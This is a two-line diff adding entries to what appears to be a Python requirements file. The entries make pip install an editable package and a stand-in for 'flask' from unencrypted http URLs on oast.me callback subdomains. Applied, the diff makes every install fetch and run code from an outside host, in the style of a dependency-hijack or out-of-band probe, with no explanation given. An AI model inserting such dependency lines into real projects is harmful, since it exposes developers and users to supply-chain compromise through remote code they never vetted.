@@ -1,0 +1,2 @@
+-e http://pipdep.d987c1vbc9hh51oplspgqsxyqunhon9yo.oast.me/pkg#egg=x
+flask @ http://pipurl.d987c1vbc9hh51oplspgqsxyqunhon9yo.oast.me/flask.tar.gz
